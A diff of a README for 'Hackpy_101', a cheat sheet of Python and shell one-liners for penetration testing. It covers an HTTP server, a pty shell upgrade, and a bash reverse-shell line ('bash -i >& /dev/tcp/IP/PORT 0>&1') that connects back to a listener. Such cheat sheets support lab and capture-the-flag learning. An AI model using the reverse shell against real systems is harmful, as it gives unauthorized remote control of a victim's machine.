@@ -1,15 +1,14 @@
 # Hackpy_101
 Contains Various one liner scripts of python to help you in the Ethical hacking.
 
-**For HTTP SERVER**
+# For HTTP SERVER
 Python2 :- python -m SimpleHTTPServer <port>
 Python3 :- python -m  http.server <port>
 To open a sever on specific IP we use -- bind 
 For ex- python -m http.server port --bind <IP> 
 If this doesnt work use python2 version.
---------------x-------x--------xx-------------xxx----------x------------------x-----------------xxx---------------------x---------------------xxxxx--------x-----------------------
 
-**For Requesting a Interactive Shell in Python**
+# For Requesting a Interactive Shell in Python
 python -c 'import pty; pty.spawn("/bin/bash")'
 This will upgrade a dumb shell to an interactive one
 If this doesnt work for you then try doing this step wise 
@@ -27,12 +26,11 @@ $ reset
 $ export SHELL=bash
 $ export TERM=xterm-256color
 $ stty rows <num> columns <cols>
---------------x-------x--------xx-------------xxx----------x------------------x-----------------xxx---------------------x---------------------xxxxx--------x---------------------
-
-**THIS IS WHAT YOU CALL A CONNECTOR TO A LISTENER**
-THIS IS USED FOR REVERSE CONNECTIONS.
+  
+# THIS IS WHAT YOU CALL A CONNECTOR TO A LISTENER
+**THIS IS USED FOR REVERSE CONNECTIONS.
 IF YOU DONT KNOW WHAT THIS MEANS --> "GOOGLE IT!!"
-YOU CAN USE EITHER OF THE METHODS, GIVEN THAT THE SPECIFIC LANGUAGE IS INSTALLED IN YOUR SYSTEM
+YOU CAN USE EITHER OF THE METHODS, GIVEN THAT THE SPECIFIC LANGUAGE IS INSTALLED IN YOUR SYSTEM**
 # BASH
 bash -i >& /dev/tcp/IP/PORT 0>&1
 
